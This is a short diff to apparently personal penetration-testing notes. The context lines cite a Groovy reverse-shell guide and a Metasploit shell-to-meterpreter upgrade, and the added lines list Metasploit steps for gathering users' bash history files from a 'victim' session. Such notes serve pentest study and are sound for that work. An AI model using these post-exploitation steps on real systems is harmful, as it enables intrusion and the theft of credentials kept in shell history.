@@ -251,3 +251,12 @@ https://dzmitry-savitski.github.io/2018/03/groovy-reverse-and-bind-shell
 
 > post/multi/manage/shell_to_meterpreter
 
+> search for history bash files in msfconsole:
+  > gather session to victim
+  > use post/linux/gather/enum_users_history
+    > set session <session ID>
+  > run
+  
+
+
+
